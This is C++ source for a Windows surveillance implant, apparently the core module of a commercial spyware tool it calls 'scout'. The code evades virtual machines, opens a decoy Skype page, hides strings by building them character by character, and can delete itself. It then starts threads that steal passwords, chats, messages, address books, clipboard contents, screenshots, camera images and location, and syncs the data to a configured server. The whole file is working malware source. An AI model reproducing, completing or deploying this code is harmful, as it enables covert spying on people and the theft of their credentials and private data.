#pragma comment(lib, "Shlwapi")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "Ws2_32")
#pragma comment(lib, "psapi")

#include <Windows.h>
#include <Psapi.h>

#include "globals.h"
#include "binpatch.h"
#include "utils.h"
#include "mayhem.h"
#include "debug.h"
#include "main.h"
#include "md5.h"
#include "zmem.h"
#include "conf.h"

#include "position.h"
#include "social.h"
#include "clipboard.h"
#include "password.h"
#include "screenshot.h"
#include "antivm.h"

#pragma include_alias( "dxtrans.h", "camera.h" )
#define __IDxtCompositor_INTERFACE_DEFINED__
#define __IDxtAlphaSetter_INTERFACE_DEFINED__
#define __IDxtJpeg_INTERFACE_DEFINED__
#define __IDxtKey_INTERFACE_DEFINED__
#include "camera.h"

BYTE pServerKey[32];
BYTE pConfKey[32];
BYTE pSessionKey[20];
BYTE pLogKey[32];

HANDLE hScoutSharedMemory = NULL;
HWND hScoutMessageWindow = NULL;
HANDLE hMsgTimer = NULL;

BOOL bCollectEvidences = TRUE;

#ifndef _DEBUG
//BYTE EMBEDDED_CONF[513] = "\xEF\xBE\xAD\xDE""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
BYTE EMBEDDED_CONF[513] = "CONF""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
#else
BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":true,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":false,\"repeat\":5},\"screenshot\":{\"enabled\":true,\"repeat\":5},\"addressbook\":{\"enabled\":true},\"chat\":{\"enabled\":true},\"clipboard\":{\"enabled\":true},\"device\":{\"enabled\":true},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":true},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":10}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
//BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":20,\"iter\":10000},\"position\":{\"enabled\":false,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":5},\"addressbook\":{\"enabled\":false},\"chat\":{\"enabled\":false},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":false},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":10}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
#endif

extern VOID SyncThreadFunction();

LRESULT CALLBACK WindowProc(
  _In_  HWND hwnd,
  _In_  UINT uMsg,
  _In_  WPARAM wParam,
  _In_  LPARAM lParam
)
{
	switch (uMsg) 
	{
	case WM_CREATE: 
		return 0; 
	case WM_PAINT: 
		return 0; 
	case WM_SIZE: 
		return 0; 
	case WM_DESTROY: 
		return 0; 	
	default: 
		return DefWindowProc(hwnd, uMsg, wParam, lParam); 
	} 

	return 0; 
}

HANDLE hPositionThread = NULL;
HANDLE hClipBoardThread = NULL;
HANDLE hPasswordThread = NULL;
HANDLE hScreenShotThread = NULL;
HANDLE hSocialThread = NULL;
HANDLE hCameraThread = NULL;

BOOL bPositionThread = FALSE;
BOOL bClipBoardThread = FALSE;
BOOL bPasswordThread = FALSE;
BOOL bScreenShotThread = FALSE;
BOOL bSocialThread = FALSE;
BOOL bCameraThread = FALSE;

int CALLBACK 
WinMain(
	__in HINSTANCE hInstance,
	__in HINSTANCE hPrevInstance,
	__in LPSTR lpCmdLine,
	__in int nCmdShow)
{

	if (FakeConditionalVersion())
	{
		SecureZeroMemory(DEMO_TAG, 3); 
		SecureZeroMemory(WMARKER, 3);
		SecureZeroMemory(CLIENT_KEY, 3);
		SecureZeroMemory(ENCRYPTION_KEY_CONF, 3);
		SecureZeroMemory(SCOUT_NAME, 3);
		SecureZeroMemory(EMBEDDED_CONF, 4);

		ShellExecute(NULL, L"open", L"http://www.skype.com", NULL, NULL, SW_SHOWNORMAL);
		return 1;
	}

	if (InitScout())
	{
		// wait for input
		WaitForInput();

		HANDLE hSyncThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
		HANDLE hMemoryThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MemoryWatchDog, NULL, 0, NULL);

		StartModules();
		
		// FIXME camera
		WaitForSingleObject(hSyncThread, INFINITE);
	}

	if (hScoutSharedMemory)
		CloseHandle(hScoutSharedMemory);

	return 0;
}

VOID MemoryWatchDog()
{
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;
	WCHAR strQuery[200] = { L'\0' };
	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	WCHAR strFormat[] = { L's', L'e', L'l', L'e', L'c', L't', L' ', L'*', L' ', L'f', L'r', L'o', L'm', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'P', L'e', L'r', L'f', L'F', L'o', L'r', L'm', L'a', L't', L't', L'e', L'd', L'D', L'a', L't', L'a', L'_', L'P', L'e', L'r', L'f', L'P', L'r', L'o', L'c', L'_', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'W', L'H', L'E', L'R', L'E', L' ', L'I', L'D', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'=', L' ', L'%', L'd', L'\0' };

	CoInitializeEx(0, COINIT_MULTITHREADED|COINIT_DISABLE_OLE1DDE);
	CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE,NULL);
	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
	{
#ifdef _DEBUG
		__asm int 3;
#endif
		return;
	}

	if (!pLoc)
	{
#ifdef _DEBUG
		__asm int 3;
#endif
		return;
	}

	BSTR bRootCIM = SysAllocString(strRootCIM);
	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) != WBEM_S_NO_ERROR)
	{
#ifdef _DEBUG
		__asm int 3;
#endif
		SysFreeString(bRootCIM);
		pLoc->Release();
		return;
	}
	SysFreeString(bRootCIM);
	if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK)
	{
#ifdef _DEBUG
		__asm int 3;
#endif
		pSvc->Release();
		pLoc->Release();
		return;
	}

	_snwprintf_s(strQuery, 200, _TRUNCATE, strFormat, GetCurrentProcessId()); 
	while (1)
	{
		VARIANT vVariant;
		VariantInit(&vVariant);
		if (WMIExecQueryGetProp(pSvc, strQuery, L"PrivateBytes", &vVariant))  //FIXME: array e invece del procname(che puo' essercene + di uno dato che sono app lecite) usa il PID!!
		{
			DWORD dwMemUsed = _wtoi(vVariant.bstrVal) / 1024;
			if (dwMemUsed >= 1000000 && bCollectEvidences == TRUE)
				bCollectEvidences = FALSE;
			if (dwMemUsed < 500000 && bCollectEvidences == FALSE)
				bCollectEvidences = TRUE;
		}
		VariantClear(&vVariant);
		Sleep(10000);
	}
}

BOOL InitScout()
{
	srand(GetTickCount());
	InitEncryptionKeys();
	
	BOOL bVM = AntiVM();
	BOOL bElite = ExistsEliteSharedMemory();
	BOOL bScout = ExistsScoutSharedMemory();
	// check for elite or scout presence 
	//if (ExistsEliteSharedMemory() || ExistsScoutSharedMemory())
	if (bVM || bElite || bScout)
	{
#ifdef _DEBUG
		OutputDebug(L"[+] An ELITE or SCOUT is already installed here!\n");
		__asm int 3;
#endif
		if (bElite && AmIFromStartup())
			DeleteAndDie(TRUE); // FIXME: forse e' ok uscire qui

		return FALSE;
	}

	if (FakeConditionalVersion())
		return FALSE;

	// load conf
	if (!LoadConf())
		return FALSE;

	//if (!DecryptConf())
	//	return FALSE;

	// create scout shared memory
	if (!CreateScoutSharedMemory())
		return FALSE;

	// create message window
	CreateMessageWindow();

	CoInitializeEx(0, COINIT_MULTITHREADED|COINIT_DISABLE_OLE1DDE);
	CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE,NULL);

	return TRUE;
}

VOID Uninstall()
{
	SocialDeleteTimeStamps();
	DeleteAndDie(TRUE);
}

VOID InitEncryptionKeys()
{
	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
	memcpy(pLogKey, ENCRYPTION_KEY, 32);
	SecureZeroMemory(pSessionKey, 20);
	
#ifdef _DEBUG
	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
#endif
}

BOOL CreateMessageWindow()
{
	return FALSE; // FIXME: un timer per ogni thread!

	WNDCLASSEX wClass;
	LPWSTR strClassName = GetRandomStringW(20);
	SecureZeroMemory(&wClass, sizeof(WNDCLASSEX));
	
	wClass.cbSize = sizeof(WNDCLASSEX);
	wClass.lpszClassName = strClassName;
	wClass.lpfnWndProc = WindowProc;

	if (!RegisterClassEx(&wClass))
	{
#ifdef _DEBUG
		OutputDebug(L"[+] Cannot create message window class: %08x\n", GetLastError());
		__asm int 3;
#endif
		return FALSE;
	}

	hScoutMessageWindow = CreateWindowEx(0L, strClassName, strClassName, 0, 0, 0, 0, 0, HWND_MESSAGE , NULL, NULL, NULL);
	if (!hScoutMessageWindow)
	{
#ifdef _DEBUG
		OutputDebug(L"[+] Cannot create message window: %08x\n", GetLastError());
		__asm int 3;
#endif
		return FALSE;
	}

	zfree(strClassName);
	return TRUE;
}

VOID StartModules()
{
	if (ConfIsModuleEnabled(L"addressbook") || ConfIsModuleEnabled(L"chat") || ConfIsModuleEnabled(L"messages"))	//FIXME: array
	{
		if (hSocialThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hSocialThread\n");
#endif
			hSocialThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SocialMain, NULL, 0, NULL);
			bSocialThread = TRUE;
		}
	}
	else
		bSocialThread = FALSE;

	if (ConfIsModuleEnabled(L"position"))																			 //FIXME: array
	{
		if (hPositionThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hPositionThread\n");
#endif
			hPositionThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PositionMain, NULL, 0, NULL);
			bPositionThread = TRUE;
		}
	}
	else
		bPositionThread = FALSE;

	if (ConfIsModuleEnabled(L"clipboard"))																			 //FIXME: array
	{
		if (hClipBoardThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hClipBoardThread\n");
#endif
			hClipBoardThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipBoardMain, NULL, 0, NULL);
			bClipBoardThread = TRUE;
		}
	}
	else
		bClipBoardThread = FALSE;

	if (ConfIsModuleEnabled(L"password"))																			 //FIXME: array
	{
		if (hPasswordThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hPasswordThread\n");
#endif
			hPasswordThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PasswordMain, NULL, 0, NULL);
			bPasswordThread = TRUE;
		}
	}
	else
		bPasswordThread = FALSE;

	if (ConfIsModuleEnabled(L"screenshot"))																			 //FIXME: array
	{
		if (hScreenShotThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hScreenShotThread\n");
#endif
			hScreenShotThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenshotMain, NULL, 0, NULL);
			bScreenShotThread = TRUE;
		}
	}
	else
		bScreenShotThread = FALSE;

	if (ConfIsModuleEnabled(L"camera"))																			 //FIXME: array
	{
		if (hCameraThread == NULL)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] Starting hCameraThread\n");
#endif
			hCameraThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CameraMain, NULL, 0, NULL);
			bCameraThread = TRUE;
		}
	}
	else
		bCameraThread = FALSE;
}